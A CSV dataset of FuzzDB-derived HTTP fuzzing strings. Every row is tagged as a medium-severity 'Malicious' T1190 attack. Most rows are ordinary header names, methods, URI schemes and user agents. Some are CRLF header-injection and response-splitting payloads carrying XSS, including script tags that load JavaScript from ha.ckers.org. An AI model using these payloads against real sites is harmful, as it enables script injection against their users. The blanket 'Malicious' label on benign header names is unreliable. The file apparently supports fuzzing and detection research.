%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Requested-With,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-ATT-DeviceId,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Wap-Profile,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Content-Type-Options,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BMOVE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
news:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
jar:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
RPC_IN_DATA,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKCOL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmlrpc.beep :,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Charset,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SUBSCRIBE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Content-Security-Policy,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CHECKIN,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authorization,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Unmodified-Since,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
modem:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Location,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BPROPFIND,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xfire:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aaas:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Origin,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tag:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
go:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ws:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tv:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&#38;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Expires,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
maps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
lastfm:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/1.22 (compatible; MSIE 2.0d; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
;id=1?id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ARBITRARY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Age,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
snmp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (PLAYSTATION 3; 1.00),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CONNECT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Referer,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sips:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gopher:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Opera/9.27 (Windows NT 5.1; U; en),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
OPTIONS,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
shttp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[]=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%c0%a6id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
im:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wss:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cvs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1\uc0a6id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
javascript:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%2526id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
RPC_OUT_DATA,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dns:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
GET,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Cache-Control,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
data:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
lsid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
apt:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rtmp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
pop:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
imap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CHECKOUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
paparazzi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Public-Key-Pins,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&amp;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-WebKit-CSP,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soap.beeps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Language,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gizmoproject:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
????id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Ranges,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
message:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1#id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc6:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BDELETE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-None-Match,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Strict-Transport-Security,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ut2004:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
platform:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dav:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
beshare:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/2.0 (compatible; MSIE 3.02; Update a; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
teamspeak:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Retry-After,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
about:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmpp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ACL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tip:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id===1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.14) Gecko/20080520 Firefox/2.0.0.14,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bitcoin:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
crid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
content:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Pragma,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sieve:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rsync:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
skype:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wtai:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msnim:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BASELINE-CONTROL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
INDEX,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
adiumxtra:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gtalk:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bolo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rmi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soldat:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Frame-Options,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ldap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
vemmi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Allow,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sip:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ETag,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
h323:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DNT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Access-Control-Allow-Origin,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Proto,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKACTIVITY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Via,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Wget/1.8.2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
\r\n,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
P3P,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Last-Modified,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Front-End-Https,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
telnet:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
VERSION-CONTROL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iax:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Length,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNCHECKOUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Host,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
service:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Transfer-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
chrome:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
doi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
palm:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Authorization,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ventrilo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
webcal:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SEARCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Connection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNLOCK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DEBUG,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authenticate,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mtqp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
coap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wyciwyg:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%u0026;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpcs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fish:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.lws:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wais:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Modified-Since,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[1&id=2]=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
info:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
0x0D0x0A,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmlrpc.beeps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
callto:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tel:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
finger:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
steam:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
itms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
spotify:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%26id%3D2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mvn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.7) Gecko/20070606,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id['&id=1']=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKWORKSPACE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Http-Method-Override,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ipp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
market:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&&&&id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ircs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Upgrade,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ed2k:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
proxy:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
thismessage:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Match,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0%0d%0ad%0%0d%0aa,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aaa:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Powered-By,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Cookie,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Datetime,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNSUBSCRIBE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BPROPPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id==1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
pres:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
smb:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Vary,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
geo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Status,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mumble:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPFIND,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
From,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
uuid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
nfs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Type,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ymsgr:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Warning,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
icap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ORDERPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%5cr%5cn,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fax:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Trailer,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mupdate:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0d%0a%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 (.NET CLR 3.5.30729) JBroFuzz/1.4,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
TRACE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
opaquelocktoken:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
WWW-Authenticate,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
